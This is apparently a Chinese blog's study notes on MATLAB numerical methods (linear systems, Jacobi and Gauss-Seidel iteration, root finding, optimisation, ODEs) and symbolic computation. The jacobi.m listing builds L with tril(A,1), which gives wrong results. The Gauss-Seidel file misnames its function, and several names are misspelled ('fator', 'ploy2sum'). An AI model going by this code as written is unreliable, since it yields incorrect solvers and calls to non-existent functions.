<p>例子：<br><img src="https://img-blog.csdnimg.cn/2020022800185844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>&lt;3&gt;多重定积分的数值求解</strong><br><img src="https://img-blog.csdnimg.cn/20200417173431428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200228002027719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="B-线性方程组求解"><a href="#B-线性方程组求解" class="headerlink" title="B 线性方程组求解"></a>B 线性方程组求解</h1><h2 id="B-a-直接法"><a href="#B-a-直接法" class="headerlink" title="B.a 直接法"></a>B.a 直接法</h2><ul>
<li>高斯消去法</li>
<li>列主元消去法</li>
<li>矩阵的三角分解法</li>
</ul>
<p><strong>&lt;1&gt;利用左除运算符直接解法</strong><br><code>Ax=b  ====&gt; x=A\b</code><br>注意：如果矩阵A是奇异的或者接近奇异的，则MATLAB会给出警告信息。</p>
<p><img src="https://img-blog.csdnimg.cn/2020022810283197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>&lt;2&gt;利用矩阵分解求解线性方程组</strong><br>1 LU分解<br>LU分解的基本方法：<br><img src="https://img-blog.csdnimg.cn/20200417182901168.png" alt="在这里插入图片描述"></p>
<p>MATLAB的LU分解函数：<br><code>[L,U]=lu(A)</code>：产生一个上三角阵U和一个变换形式的下三角阵L，使之满足A&#x3D;LU。注意，这里的矩阵A必须是方阵。<br><code>[L,U,P]=lu(A)</code>：产生一个上三三角阵U和一个下三角阵L以及一个置换矩阵P，使之满足PA&#x3D;LU。同样，矩阵A必须是方阵。</p>
<p>用LU分解求解线性方程组：<br><img src="https://img-blog.csdnimg.cn/20200417183608726.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200228103556345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2 QR分解<br>3 Cholesky分解</p>
<h2 id="B-b-迭代法"><a href="#B-b-迭代法" class="headerlink" title="B.b 迭代法"></a>B.b 迭代法</h2><p><img src="https://img-blog.csdnimg.cn/20200228103759163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228103919930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<p>jacobi.m</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> [y,n]=jacobi(A,b,x0,ep)</span><br><span class="line">	D=diag(diag(A)); % 对角阵</span><br><span class="line">	L=-tril(A,1);</span><br><span class="line">	U=-triu(A,1);</span><br><span class="line">	B=D\(L+U);</span><br><span class="line">	f=D\b;</span><br><span class="line">	y=B*x0+f;</span><br><span class="line">	n=1;</span><br><span class="line">	<span class="keyword">while</span> norm(y-x0)&gt;=ep</span><br><span class="line">		x0=y;</span><br><span class="line">		y=B*x0+f;</span><br><span class="line">		n=n+1;	</span><br><span class="line">	end</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200228105128924.png" alt="在这里插入图片描述"><br>gauseidel.m</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> [y,n]=jacobi(A,b,x0,ep)</span><br><span class="line"> 	D=diag(diag(A)); % 对角阵</span><br><span class="line">	L=-tril(A,-1);</span><br><span class="line"> 	U=-triu(A,1);</span><br><span class="line"> 	B=(D-L)\U;</span><br><span class="line"> 	f=(D-L)\b;</span><br><span class="line"> 	y=B*x0+f;</span><br><span class="line"> 	n=1;</span><br><span class="line"> 	<span class="keyword">while</span> norm(y-x0)&gt;=ep</span><br><span class="line">	  	x0=y;</span><br><span class="line"> 	 	y=B*x0+f;</span><br><span class="line">  		n=n+1; </span><br><span class="line"> 	end</span><br></pre></td></tr></table></figure>

<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200228110442423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有时候高斯-赛德尔迭代法求解线性方程组可能不收敛。<br><img src="https://img-blog.csdnimg.cn/20200228110551989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228110720472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="C-非线性方程求解与函数极值计算"><a href="#C-非线性方程求解与函数极值计算" class="headerlink" title="C 非线性方程求解与函数极值计算"></a>C 非线性方程求解与函数极值计算</h1><h2 id="C-a-非线性方程数值求解"><a href="#C-a-非线性方程数值求解" class="headerlink" title="C.a 非线性方程数值求解"></a>C.a 非线性方程数值求解</h2><p><strong>&lt;1&gt;单变量非线性方程求解</strong><br>函数的调用格式：<code>x=fzero(filename, x0)</code><br>其中，filename是待求根方程左端的函数表达式，x0是初始值。</p>
<p><img src="https://img-blog.csdnimg.cn/20200228111312813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>&lt;2&gt;非线性方程组的求解</strong><br>函数的调用格式为：<br><code>x=fsolve(filename, x0, option)</code><br>其中，x为返回的近似解，filename是待求根方程左端的函数表达式，x0是初值，option用于设置优化工具箱的优化参数，可以调用optimset函数来完成。</p>
<p><img src="https://img-blog.csdnimg.cn/20200228112014522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="C-b函数极值的计算"><a href="#C-b函数极值的计算" class="headerlink" title="C.b函数极值的计算"></a>C.b函数极值的计算</h2><ul>
<li>极大值（最大值）</li>
<li>极小值（最小值）</li>
</ul>
<p><strong>Matlab只考虑最小值问题的计算，如果要求$f(x)$的最大值，可以求$-f(x)$的最小值</strong>。<br><strong>&lt;1&gt;无约束最优化问题</strong><br>无约束最优化问题的一般描述为：<br><img src="https://img-blog.csdnimg.cn/20200417213758170.png" alt="在这里插入图片描述"><br>求最小值点和最小值的函数：<br><code>[xmin, fmin]=fminbnd(filename, x1, x2, option)</code><br><code>[xmin, fmin]=fminsearch(filename, x0, option)</code><br><code>[xmin, fmin]=fminunc(filename, x0, option)</code><br>fminbnd:一元函数<br>fminsearch:单纯形法。多元<br>fminunc:拟牛顿法。多元</p>
<p>其中，filename是定义的目标函数。第一个函数的输入变量x1、x2分别表示被研究区间的左右边界。后两个函数的输入变量<strong>x0是一个向量，表示极值点的初值</strong>。option为优化参数，可以通过optimset函数来设置。</p>
<p><img src="https://img-blog.csdnimg.cn/20200228112725964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200228113035113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>&lt;2&gt;有约束最优化问题</strong><br>有约束最优化问题的一般描述为：<br><img src="https://img-blog.csdnimg.cn/2020041721425675.png" alt="在这里插入图片描述"><br>$s.t.是subject to 的缩写，表示x要满足后面的约束条件。$<br>约束条件可细化为：</p>
<ul>
<li>线性不等式约束</li>
<li>线性等式约束</li>
<li>非线性不等式约束</li>
<li>非线性等式约束</li>
<li>x的上界和下界</li>
</ul>
<p>求有约束条件下的最小值的函数为：<br><code>[xmin, fmin]=fmincon(filename, x0, A, b, Aeq, beq, Lbnd, Ubnd, Nonf, option)</code><br>其中，xmin, fmin,filename,x0和option的含义与求最小值函数相同。其余参数为约束条件，包括线性不等式约束、线性等式约束、x的下界和上界以及定义非线性约束的函数。如果某个约束不存在，则用空矩阵表示。</p>
<p>AX &lt;&#x3D; b（线性不等式约束，如果是约束是大于，则左右乘-1）<br>AeqX &#x3D; beq（线性等式约束）<br>G(x) &lt;&#x3D; 0（非线性不等式约束）<br>Ceq(X) &#x3D; 0（非线性等式约束）<br>Lbnd &lt;&#x3D; X &lt;&#x3D; Ubub（变量约束）</p>
<p><img src="https://img-blog.csdnimg.cn/20200228113324929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="D-常微分方程数值求解"><a href="#D-常微分方程数值求解" class="headerlink" title="D 常微分方程数值求解"></a>D 常微分方程数值求解</h1><h2 id="D-a常微分方程数值求解的一般概念"><a href="#D-a常微分方程数值求解的一般概念" class="headerlink" title="D.a常微分方程数值求解的一般概念"></a>D.a常微分方程数值求解的一般概念</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228114607463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228114703484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="D-b-常微分方程数值求解函数"><a href="#D-b-常微分方程数值求解函数" class="headerlink" title="D.b 常微分方程数值求解函数"></a>D.b 常微分方程数值求解函数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228114838143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228114921202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228115023249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228115124181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228115136346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="D-c-刚性问题"><a href="#D-c-刚性问题" class="headerlink" title="D.c 刚性问题"></a>D.c 刚性问题</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228115220582.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228115242412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228115330197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228115345972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(07)符号计算</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8807%EF%BC%89%E3%80%90Matlab%E3%80%91%E7%AC%A6%E5%8F%B7%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="A-符号对象"><a href="#A-符号对象" class="headerlink" title="A 符号对象"></a>A 符号对象</h1><h2 id="A-a-符号对象的建立"><a href="#A-a-符号对象的建立" class="headerlink" title="A.a 符号对象的建立"></a>A.a 符号对象的建立</h2><ul>
<li><code>sym</code>函数</li>
<li><code>syms</code>命令</li>
</ul>
<p><strong>&lt;1&gt; sym函数</strong><br>sym函数用于建立单个符号对象，其常用调用格式为：<code>符号对象名=sym(A)</code><br>将由A来建立符号对象。其中，A可以是一个数值常量、数值矩阵或数值表达式（<code>不加单引号</code>），此时符号对象为一个符号常量；A也可以是一个变量名（<code>加单引号</code>），这是符号对象为一个符号常量。</p>
<span id="more"></span>

<p>例子（符号常量）：<br><img src="https://img-blog.csdnimg.cn/20200228121234966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>$sin(sym(pi&#x2F;3))$得到的是一个表达式，而$sin(pi&#x2F;3)$得到的是一个数值。<br>例子（符号变量）：<br><img src="https://img-blog.csdnimg.cn/20200413185744731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>结论：符号计算的结果是一个精确的数学表达式。数值计算的结果是一个数值。</strong></p>
<p>将符号表达式转化为数值结果，使用<code>eval()</code><br><img src="https://img-blog.csdnimg.cn/20200228121417181.png" alt="在这里插入图片描述"></p>
<p><strong>sym一次只能定义单个符号对象，如果符号对象很多，就不方便。</strong></p>
<hr>
<p><strong>&lt;2&gt;syms命令</strong><br>syms命令可以一次定义多个符号变量，其一般调用格式如下：<br><code>syms 符号变量1 符号变量2 ... 符号变量n</code><br>其中，变量名不能加单引号，相互之间用空格隔开。如：<br><img src="https://img-blog.csdnimg.cn/20200413190225704.png" alt="在这里插入图片描述"></p>
<p>建立完符号对象，再用符号运算符连接起来，就组成了符号表达式。</p>
<h2 id="A-b-符号对象的运算"><a href="#A-b-符号对象的运算" class="headerlink" title="A.b 符号对象的运算"></a>A.b 符号对象的运算</h2><p><strong>&lt;1&gt;四则运算</strong><br>符号表达式的四则运算与数值运算一样，用<code>+、-、*、/</code>运算符实现，其运算结果依然是一个符号表达式。<br><img src="https://img-blog.csdnimg.cn/20200413190435706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>&lt;2&gt;关系运算</strong></p>
<ul>
<li>6种关系运算符：<code>&lt;、&lt;=、&gt;、&gt;=、==、~=</code>。</li>
<li>对应的6个函数：<code>lt()、le()、gt()、ge()、ge()、eq()、ne()</code>。</li>
</ul>
<p>若参与运算的是<code>符号表达式</code>，其结果是一个符<code>号关系表达式</code>；若参与运算的是<code>符号矩阵</code>，其结果是由符号关系表达式组成的矩阵。</p>
<p><img src="https://img-blog.csdnimg.cn/20200228131518319.png" alt="在这里插入图片描述"></p>
<p>在进行符号对象的运算前，可用<code>assume</code>函数对符号对象设置域，函数调用格式为：<br><code>assume(condition)</code><br><code>assume(expr, set)</code></p>
<p>第一种格式指定变量满足条件condition，第二种格式指定表达式expr属于set<br><img src="https://img-blog.csdnimg.cn/20200413191303785.png" alt="在这里插入图片描述"></p>
<p><strong>&lt;3&gt;逻辑运算</strong></p>
<ul>
<li>3种逻辑运算符：<code>&amp;(与)、|(或)和~(非)</code></li>
<li>4个逻辑运算函数：<code>and()、or()、not()和xor()</code></li>
<li><img src="https://img-blog.csdnimg.cn/20200413191721348.png" alt="在这里插入图片描述"></li>
</ul>
<p><strong>&lt;4&gt;因式分解与展开运算</strong><br>MATLAB提供了对符号表达式进行因式分解、展开、合并的函数，函数的调用格式为：<br><code>fator(s)</code>：对符号表达式s分解因式。</p>
<p><img src="https://img-blog.csdnimg.cn/20200413192153869.png" alt="在这里插入图片描述"></p>
<p><code>expand(s)</code>：对符号表达式s进行展开。<br><code>collect(s)</code>：对符号表达式s合并同类项。<br><code>collect(s, v)</code>：对符号表达式s按变量v合并同类项。</p>
<p><strong>&lt;5&gt;其他计算</strong></p>
<ul>
<li>1 提取有理分式的分子分母：<code>[n, d]=numden(s)</code><br><img src="https://img-blog.csdnimg.cn/20200228133337419.png" alt="在这里插入图片描述"></li>
<li>2 提取符号表达式的系数(低位到高位)：<code>c=coeffs(s, x)</code><br><img src="https://img-blog.csdnimg.cn/20200228135140426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>3 符号表达式化简：<code>simplify(s)</code></li>
<li>4符号多项式与多项式系数向量之间的转换：<br> 符号多项式转换为多项式系数向量：<code>p=sym2poly(s)</code><br>多项式系数向量转换为符号多项式：<code>s=ploy2sum()</code><br><img src="https://img-blog.csdnimg.cn/2020022813472466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>f只能有一种符号变量</strong></li>
</ul>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200228135340128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>&lt;6&gt;符号运算中变量的确定</strong></p>
<ul>
<li><p>如果没有明确指定自变量，MATLAB将按以下原则确定主变量并对其进行相应运算：<br>寻找除了i、j之外，在字母顺序上最接近x的小写字母。<br>若表达式中有两个符号变量与x的距离相等，则ASCII码大者优先。</p>
</li>
<li><p><code>symvar()</code>函数可以用于查找一个符号表达式中的符号变量，函数的调用格式为：<code>symvar(s,n)</code>。函数返回符号符号表达式s中的n个符号变量。因此，可以用<code>symvar(s, 1)</code>查找表达式s的主变量。</p>
</li>
</ul>
<h2 id="A-c-符号矩阵"><a href="#A-c-符号矩阵" class="headerlink" title="A.c 符号矩阵"></a>A.c 符号矩阵</h2><p>符号矩阵也是一种符号表达式，所以符号表达式运算都可以在矩阵意义下进行。<br>注意：这些函数作用于符号矩阵时，是分别作用于矩阵的每一个元素。</p>
<p><img src="https://img-blog.csdnimg.cn/20200413194703315.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2020022814001234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>由于符号矩阵也是矩阵，所以有关矩阵的函数也可以使用。</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20200228140313448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="B-符号微积分"><a href="#B-符号微积分" class="headerlink" title="B 符号微积分"></a>B 符号微积分</h1><h2 id="B-a-符号函数的极限"><a href="#B-a-符号函数的极限" class="headerlink" title="B.a 符号函数的极限"></a>B.a 符号函数的极限</h2><p><strong>&lt;1&gt;符号函数的极限</strong></p>
<ul>
<li>求符号函数极限的命令<code>limit</code>，其调用格式为：<code>limit(f, X, a)</code>即求函数f关于变量x在a点的极限。若x省略，则采用系统默认的自变量。a的默认值为0。</li>
<li><code>limit</code>函数的另一种功能是求单边极限，其调用格式为：<br><code>limit(f, x, a, &#39;right&#39;)</code><br><code>limit(f,x,a,&#39;left&#39;)</code></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200228141905197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="B-b-符号函数的导数"><a href="#B-b-符号函数的导数" class="headerlink" title="B.b 符号函数的导数"></a>B.b 符号函数的导数</h2><p>MATLAB中的求导函数为：<code>diff(f, x, n)</code><br>即求函数f关于变量x的n阶导数。参数x的用法同求极限函数<code>limit</code>，可以缺省，默认值与<code>limit</code>相同，n的默认值是1。</p>
<p><img src="https://img-blog.csdnimg.cn/20200228142050701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>极限、导数、微分的概念是紧密关联的。有极限是可导的前提，而导数是微分之商，因此导数也称为微商。</p>
<h2 id="B-c-符号函数的积分"><a href="#B-c-符号函数的积分" class="headerlink" title="B.c 符号函数的积分"></a>B.c 符号函数的积分</h2><p><strong>&lt;1&gt;不定积分</strong></p>
<p>在MATLAB中，求不定积分的函数是<code>int</code>，其常用调用格式为：<code>int(f, x)</code>求函数f对变量x的不定积分。</p>
<p><img src="https://img-blog.csdnimg.cn/20200228142426467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>&lt;2&gt;定积分</strong><br>在MATLAB中，定积分的计算也使用int命令，但调用格式有区别：<br><code>int(f, a, b)</code><br>其中，a、b分别表示定积分的下限和上限。</p>
<ul>
<li>当函数关于变量x在闭区间[a, b]可积时，函数返回一个定积分的结果。</li>
<li>当a、b中有一个是inf时，函数返回一个广义积分。</li>
<li>当a、b中有一个是符号表达式时，函数返回一个符号函数。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200228142614583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="C-级数"><a href="#C-级数" class="headerlink" title="C 级数"></a>C 级数</h1><h2 id="C-a-级数求和"><a href="#C-a-级数求和" class="headerlink" title="C.a 级数求和"></a>C.a 级数求和</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228143208393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228143235372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022814341945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>hypergeom:超几何函数</p>
</blockquote>
<h2 id="C-b-泰勒级数"><a href="#C-b-泰勒级数" class="headerlink" title="C.b 泰勒级数"></a>C.b 泰勒级数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228143613868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228143717639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228143802375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="D-符号方程求解"><a href="#D-符号方程求解" class="headerlink" title="D 符号方程求解"></a>D 符号方程求解</h1><h2 id="D-a-代数方程"><a href="#D-a-代数方程" class="headerlink" title="D.a 代数方程"></a>D.a 代数方程</h2><blockquote>
